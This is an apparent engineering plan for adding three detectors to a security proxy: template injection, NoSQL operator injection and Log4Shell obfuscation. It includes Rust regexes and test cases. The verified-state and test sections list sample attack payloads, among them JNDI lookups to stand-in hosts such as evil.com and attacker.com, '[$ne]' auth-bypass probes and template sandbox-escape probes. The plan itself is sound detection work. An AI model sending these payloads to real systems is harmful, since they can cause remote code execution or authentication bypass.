# Phase 1 — HIGH RCE coverage (Run-5)

> **Branch:** all changes target `develop`. Three new/extended detectors covering RCE-class gaps.

---

## GAP-006 · Server-Side Template Injection (SSTI) — new detector

**Source:** Run-5 §GAP-006.

### Verified state (2026-05-08, on `develop`)

`grep -rn 'jinja\|{{\|template.injection' crates/aegis-security/src/detectors/` → no matches. SSTI patterns aren't in any current detector. The QA's probes (`/search?q={{7*7}}`, `/search?q=${7*7}`) pass through cleanly.

### Detection logic

**Why a dedicated detector (not part of `command_injection`):** SSTI's syntax is template-engine-specific (`{{ }}`, `${ }`, `<#...>`, `#set(...)`) — distinct enough from shell-meta cmdi (`$()`, `|cmd`) that bundling would dilute the cmdi pattern set. SSTI also has its own characteristic payloads (`{{config}}`, `{{__class__.__mro__}}`) that aren't shell-shaped at all.

**Why these patterns and not bare `{{x}}`:** A bare `{{user.name}}` is a **template OUTPUT** that legit JSON / HTML responses sometimes echo. Triggering on bare matched braces would FP on every API that pretty-prints a JSON template error or a web framework's debug page. Each pattern below requires **both** the brace-syntax AND a suspicious internal:

- **Numeric expressions** (`{{7*7}}`, `${7*7}`) — the canonical SSTI proof-of-concept payload. No legit template echoes a multiplication expression in a URL/body.
- **Python attribute access** (`__class__`, `__mro__`, `__subclasses__`) — Jinja2/Mako sandbox-escape primitives.
- **Engine-specific globals** (`config`, `cycler`, `joiner`, `namespace`, `request`, `self`, `lipsum`, `url_for`) — Jinja2 globals that aren't legit URL/body content.
- **Tag statements** (`{% set %}`, `{% for %}`, `<#assign>`, `#set(`) — only template-side execution constructs use these.
- **Spring SpEL** (`${T(...)`, `${#root.}`, `${@bean.}`, `${new Class(...)`) — type / bean / instantiation references unique to SpEL exploitation.

**Score: 50** (high-confidence injection tier, same as sqli/cmdi). Justification: SSTI is RCE-class. The patterns require both syntax + suspicious internal, so FP rate matches sqli's profile. Two confirmed hits → block.

**Field tag:** `template_injection` (audit log + dashboard breakdown).

### Plan

New detector `crates/aegis-security/src/detectors/template_injection.rs`. Mirrors `command_injection` shape (regex over URI + body, both raw and URL-decoded).

**Pattern categories:**

```rust
static SSTI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Jinja2 / Twig / Liquid expression syntax with
        // suspicious internals. Bare `{{x}}` doesn't fire —
        // require numeric expression OR Python/template
        // attribute access (`.__class__`, `__mro__`, `config`,
        // `cycler`, `joiner`, `namespace`).
        r"(?i)\{\{\s*\d+\s*\*\s*\d+\s*\}\}",
        r"(?i)\{\{\s*['\"]?\w*['\"]?\.\s*__\w+__",
        r"(?i)\{\{\s*config\s*\}\}",
        r"(?i)\{\{\s*cycler\.|\{\{\s*joiner\.|\{\{\s*namespace\(",
        r"(?i)\{\{\s*request\.|\{\{\s*self\.",
        r"(?i)\{\{\s*lipsum\.|\{\{\s*url_for",
        // Tag-style template injection (Jinja2/Twig statements,
        // Freemarker/Velocity directives).
        r"(?i)\{%\s*(?:set|for|if|import|extends|include)\s",
        r"(?i)<#\s*(?:assign|list|if|include|import)\s",
        r"(?i)#set\s*\(",     // Velocity
        r"(?i)#if\s*\(",      // Velocity
        // ${expr} — Freemarker / Spring SpEL / Mako / shell-
        // style template. Same conservative trigger:
        // numeric expression, `T(...)` SpEL type ref, bean
        // accessor (`#root.`, `@<bean>.`).
        r"(?i)\$\{\s*\d+\s*\*\s*\d+\s*\}",
        r"(?i)\$\{\s*T\s*\(\s*['\"]",
        r"(?i)\$\{\s*#root\.|\$\{\s*@\w+\.",
        r"(?i)\$\{\s*new\s+\w+\.",
        // Handlebars / Mustache helpers that are exec-capable.
        r"(?i)\{\{#with\s",
        r"(?i)\{\{lookup\s+\(",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("ssti regex compiles"))
    .collect()
});
```

**Wiring (mirrors Run-4 cmdi pattern verbatim):**

1. `detectors/mod.rs` — add module + register in `default_detectors()`.
2. `detectors/mask.rs` — add `DetectorClass::TemplateInjection` (bit 9), serde-default field on `DetectorMaskBody`.
3. `aegis-core/src/config.rs` — `DetectorsConfig.template_injection`.
4. `aegis-proxy/src/run.rs` — add `"template_injection"` to `rules_engine.policies`.
5. `aegis-control/src/interop/rule_map.rs` — `"template_injection" | "ssti" => ("rules_engine", "template_injection")`.
6. `aegis-control/src/interop/control.rs::tests::ctx_v23` — extend test fixture.
7. `aegis-control/src/api/rules.rs` — extend `RESERVED_RULE_IDS`.
8. `aegis-control/src/metrics/detector_hits.rs` — extend `class_label::ALL`.
9. `aegis-control/src/api/detectors.rs` — extend test struct literals.

**Tests** (in `template_injection.rs`):
- Positive: QA reproductions (`{{7*7}}`, `${7*7}`), Jinja2 (`{{config}}`, `{{__class__}}`), Twig statements, Freemarker `<#assign>`, Velocity `#set`, Spring SpEL `${T(...)}`, Handlebars `{{#with}}`.
- Negative: bare `{{x}}` template output, `${USER}` plain envvar, regex patterns containing `{{`, JSON Schema-style `{{ }}` placeholders.

**Doc:** `docs/security/detectors/template-injection.md` (full per-detector doc, mirrors `command-injection.md` shape).

### Acceptance

- [ ] Detector blocks all 3 QA SSTI probes
- [ ] Negative tests catch the FP traps documented above
- [ ] Toggleable via `set_profile { policies: ["template_injection"], mode: "log_only" }`
- [ ] Per-detector doc landed
- [ ] Cross-ref docs updated (README, security-engine, tiered-protection, profiles, implementation-matrix)

**Effort:** ~1.5 h (detector + wiring + 15+ tests + doc).

---

## GAP-007 · NoSQL Injection — new detector

**Source:** Run-5 §GAP-007.

### Verified state

No `$ne`/`$gt`/`$where` patterns in any detector. QA probes (`?username[$ne]=invalid`, JSON `{"$ne":"x"}`) pass through.

### Detection logic

**Why a dedicated detector (not part of `sqli`):** sqli patterns target SQL syntax — keywords (`UNION`, `SELECT`, `OR 1=1`), comment markers (`--`, `/* */`), boolean injection. NoSQL operator injection has a completely different syntax — bracketed operator names in query strings (`?param[$ne]=foo`) and `$`-prefixed keys in JSON bodies (`{"$where": "..."}`). Folding these into sqli would break the cohesion of the sqli pattern set.

**Why these patterns:** MongoDB query operators are a closed, documented list. The detector matches **only** the documented operator names (`$ne`, `$gt`, `$lt`, `$gte`, `$lte`, `$in`, `$nin`, `$eq`, `$regex`, `$where`, `$or`, `$and`, `$not`, `$nor`, `$exists`, `$type`, `$elemMatch`, `$all`, `$size`, `$expr`, `$jsonSchema`, `$mod`, `$text`, `$search`, `$comment`, geo operators). Bare `$` in URL values (e.g. `?cost=$10`, currency strings) doesn't match because the pattern requires `[$<word>]` brackets or `"$<word>":` JSON-key shape.

**Two query surfaces, two patterns:**

1. **Query string:** `?param[$ne]=foo` — the bracketed-operator shape only appears in NoSQL injection. Legit HTML form submission can produce `?items[]=a` (PHP-style array param) but never `[$op]`.
2. **JSON body keys:** `"$ne":` requires the leading quote + colon — distinguishes from a legit `$`-containing string value (`"price":"$10"`) which never has `$` in the key position.

**Why not parse the JSON to find `$`-prefixed keys?** Parsing every JSON body would add a real cost to every request (regex is faster). The string-match pattern `"$<op>":` is cheap and equivalent for valid JSON; for malformed JSON, neither approach is reliable.

**Score: 50** (high-confidence injection tier, same as sqli). Justification: NoSQL operator injection is auth-bypass / data-exfil class. Pattern is so specific (closed operator vocabulary) that legit Postgres `$1` placeholders, currency strings, and template variables never match. Two confirmed hits → block.

**Field tag:** `nosql_injection`.

### Plan

New `crates/aegis-security/src/detectors/nosql_injection.rs`. Two surfaces: query string and JSON body keys.

**Patterns:**

```rust
static NOSQL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    [
        // Query string: `param[$ne]=foo`, `param[$gt]=...`,
        // `param[$where]=...`. The `[$<op>]` shape only appears
        // in NoSQL operator injection — legit URL params don't
        // wrap operator names in brackets.
        r"(?i)\[\$(?:ne|gt|gte|lt|lte|in|nin|eq|regex|where|or|and|not|nor|exists|type|elemMatch|all|size|expr|jsonSchema|mod|geoIntersects|geoWithin|near|nearSphere|text|search|comment)\]",
        // JSON body: `"$ne":`, `"$where":`, etc. Conservative —
        // require leading quote + exact MongoDB operator names
        // so legit fields named e.g. `cost` (which contains `$`)
        // don't trip.
        r#"(?i)"\$(?:ne|gt|gte|lt|lte|in|nin|eq|regex|where|or|and|not|nor|exists|type|elemMatch|all|size|expr|jsonSchema|mod|geoIntersects|geoWithin|near|nearSphere|text|search|comment)"\s*:"#,
        // CouchDB / Mongo `$where` JS evaluation — high-impact.
        // The `[$where]` and `"$where":` patterns above already
        // catch this; this third pattern catches the
        // `db.collection.find({$where: function(){...}})` shape
        // when serialized into a request body.
        r"(?i)\$where\s*:\s*function\s*\(",
    ]
    .iter()
    .map(|p| Regex::new(p).expect("nosql regex compiles"))
    .collect()
});
```

**Wiring:** identical pattern to SSTI above (mod.rs, mask.rs bit 10, config.rs, run.rs, rule_map.rs, ctx_v23, RESERVED_RULE_IDS, class_label::ALL).

**Tests:**
- Positive: `?username[$ne]=invalid`, `?id[$gt]=`, `?q[$regex]=.*`, JSON `{"$ne":"x"}`, JSON `{"$where":"function(){return true}"}`, nested operator in JSON.
- Negative: `?cost=$1.50` (Postgres parameter placeholder), `?price=$10` (currency), JSON `{"item":"$cost"}` (legit `$` in value), JSON `{"_id":"abc"}` (single underscore is fine).

**Doc:** `docs/security/detectors/nosql-injection.md`.

### Acceptance

- [ ] Detector blocks all 3 QA NoSQL probes
- [ ] Postgres `$1` placeholder + currency don't FP
- [ ] Toggleable via `set_profile`
- [ ] Per-detector doc + cross-refs landed

**Effort:** ~1.5 h.

---

## GAP-008 · Log4Shell obfuscation — extend `command_injection`

**Source:** Run-5 §GAP-008. CVE-2021-44228, CVSS 10.0.

### Verified state

No `${jndi:` patterns anywhere. The QA's "2/5 caught" was incidental — the basic `${jndi:ldap://attacker.com/a}` payload happened to overlap with the SSRF detector when the URL portion was `ldap://`. But SSRF doesn't list `ldap://` either, so it must have hit something else (gopher://-shaped variants?). Confirmed: no Log4Shell-specific pattern.

### Detection logic

**Why fold into `command_injection` (not a new `log4shell` class):** Log4Shell IS command injection — the JNDI lookup ultimately fetches and executes attacker-controlled code. From the operator's perspective, "this request triggered an RCE class" is the right audit category. A separate `log4shell` class would split RCE statistics and require duplicate `set_profile` toggles for closely-related semantics.

**Why these specific patterns:**

1. **Direct `${jndi:<scheme>://...}`** — the canonical Log4Shell shape. The scheme allowlist (`ldap`, `ldaps`, `rmi`, `dns`, `nis`, `iiop`, `corba`, `nds`, `http`, `https`) covers every documented exploitation primitive. We DON'T match bare `${jndi:` without a scheme — that could appear in legit JNDI lookups in app config strings; with a scheme + `://`, intent is unambiguous.

2. **Bare `${jndi:`** — second pattern, no scheme required. Defense-in-depth for the (rare) case where an attacker omits the scheme to bypass pattern 1. The trade-off: very small FP risk on apps that legitimately use JNDI lookups in URL/body content. Documented; operators can disable cmdi class entirely if needed.

3. **Nested obfuscation** `${${::-j}${::-n}${::-d}${::-i}:...}` — Log4j evaluates inner `${...}` first; attackers exploit this with empty-default substitution `${::-X}` which evaluates to `X`. The pattern requires the suspicious nesting (`${${...}`) AND the letters `j`, `n`, `d`, `i` in order somewhere with `:` afterwards. Bare `${HOME}` envvars don't match because there's no nested `${${...}`.

4. **Case-folding obfuscation** `${${lower:j}ndi:...}` — uses Log4j's `lower:`/`upper:`/`env:`/`sys:`/`date:` lookups to obscure the literal `jndi`. The pattern catches the `${${(lower|upper|env|sys|date):...}` shape, which is a very narrow construct unique to Log4j.

**Critical: scan request HEADERS too.** Active Log4Shell exploitation predominantly arrives in `User-Agent`, `Referer`, `X-Api-Version`, `Authorization`, and `Cookie` — not in the URL or body. The current `command_injection` detector only scans URI + body. The fix extends it to a documented allowlist of headers commonly logged by application frameworks.

**Score: 60** (Critical RCE / known-CVE tier — one tier above baseline cmdi). Justification:
- CVSS 10.0 — most severe CVE in years; active exploitation worldwide.
- Pattern specificity: `${jndi:<scheme>://` is so specific that FP rate is essentially zero on real traffic.
- One hit + one prior risk-event = block (60 + 30 = 90 ≥ block_at:80). For traffic with no prior risk, two hits cap at 100 (60 + 60 → max-clamp).

**Field tag:** still `command_injection` — the audit log row records the firing detector class, not the sub-pattern. The audit `rule_id` stays `command_injection`. Operators investigating high-cmdi-volume from a host can grep their audit log for `${jndi:` to identify Log4Shell specifically.

### Plan

Extend `command_injection.rs` patterns (Log4Shell is RCE-class — same semantic bucket). Adding 4 patterns to the existing detector keeps the wiring simple (no new detector class to register).

```rust
// command_injection.rs CMDI_PATTERNS additions:

// Log4Shell direct (CVE-2021-44228) — ${jndi:<scheme>://...}
r"(?i)\$\{jndi\s*:\s*(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http|https)\s*:",

// Log4Shell obfuscated — ${${::-j}${::-n}${::-d}${::-i}:...}
// Catches ANY brace-expression that contains 'j','n','d','i'
// in order somewhere with `:` afterwards. Conservative: requires
// the suspicious nesting (`${${...}`) so plain `${jndi:`
// already covered above doesn't double-match.
r"(?i)\$\{[^}]*\$\{[^}]*j[^}]*\}[^}]*\$\{[^}]*n[^}]*\}[^}]*\$\{[^}]*d[^}]*\}[^}]*\$\{[^}]*i[^}]*\}[^}]*:",

// Log4Shell case-folding obfuscation — ${${lower:j}ndi:...}
r"(?i)\$\{[^}]*\$\{(?:lower|upper|env|sys|date)\s*:[^}]*\}[^}]*\}",

// Bare `${jndi:` without scheme — operator may have shipped
// a custom JNDI lookup; we want to flag that too.
r"(?i)\$\{jndi\s*:",
```

**Implementation note: emit at score 60 from a separate pattern group.** The existing `command_injection.rs::check()` returns immediately on first match with a hardcoded score of 50. To support the higher Log4Shell score without disturbing baseline cmdi scoring, refactor to:

```rust
fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
    // GAP-008 — Log4Shell patterns checked first; score 60.
    for re in LOG4SHELL_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal { score: 60, tag: "command_injection".into(), field: field.into() });
            return;
        }
    }
    // Baseline cmdi patterns; score 50.
    for re in CMDI_PATTERNS.iter() {
        if re.is_match(input) {
            signals.push(Signal { score: 50, tag: "command_injection".into(), field: field.into() });
            return;
        }
    }
}
```

Both groups emit the same `tag: "command_injection"` so the audit log + Prometheus by-class counter stay coherent.

**Critical:** these patterns must scan **request headers** as well, not just URI + body. Log4Shell active exploitation primarily uses User-Agent, Referer, X-Api-Version, and other custom headers. The current `command_injection` detector only scans URI + body.

**Implementation: extend `inspect()` to scan select header values** (User-Agent, Referer, X-Api-Version, X-Forwarded-For, plus a small allowlist of common custom headers):

```rust
impl Detector for CommandInjectionDetector {
    fn inspect(&self, req: &RequestView<'_>) -> Vec<Signal> {
        let mut signals = Vec::new();
        // ... existing URI + body scans ...

        // GAP-008 (2026-05-08) — Log4Shell payloads frequently
        // arrive in headers (UA, Referer, custom auth/version
        // headers). Scan a conservative allowlist of common
        // headers; broader header scans risk header_injection
        // overlap.
        for name in [
            "user-agent", "referer", "x-api-version",
            "x-forwarded-for", "x-real-ip", "authorization",
            "cookie", "x-requested-with",
        ] {
            if let Some(val) = req.headers.get(name).and_then(|v| v.to_str().ok()) {
                check(val, name, &mut signals);
                check(&super::url_decode(val), name, &mut signals);
            }
        }

        signals
    }
}
```

**Tests:** add to existing `command_injection.rs::tests` module:
- Positive: `${jndi:ldap://evil.com/a}` in URL, in body, in User-Agent, in Referer; `${${::-j}${::-n}${::-d}${::-i}:ldap://evil}` nested; `${${lower:j}ndi:rmi://evil}` case-folded.
- Negative: `${USER}` plain envvar, `${HOME}/path` legit shell template, JNDI references in legit HTML rendered as plaintext.

**Doc:** update `docs/security/detectors/command-injection.md` with a "Log4Shell coverage" subsection. No new doc file needed.

### Acceptance

- [ ] All 5 QA Log4Shell variants block (basic + RMI + nested + case-fold + UA-header)
- [ ] Plain `${USER}` envvar doesn't FP
- [ ] Header-scan allowlist documented in the detector code + doc

**Effort:** ~30 min (regex add + header scan + tests + doc paragraph).

---

## Sequencing

Three independent detectors. Suggested order:

1. **GAP-008 first** (smallest — extends existing detector + a few lines for header scan).
2. **GAP-006 SSTI** next (medium — new detector + full doc + 9 cross-ref files).
3. **GAP-007 NoSQL** last (medium — same shape as SSTI; can copy-paste the wiring).

Three PRs:

1. `feat(detectors): Log4Shell obfuscation patterns + header scan in cmdi (GAP-008)`
2. `feat(detectors): dedicated template_injection detector (GAP-006)`
3. `feat(detectors): dedicated nosql_injection detector (GAP-007)`
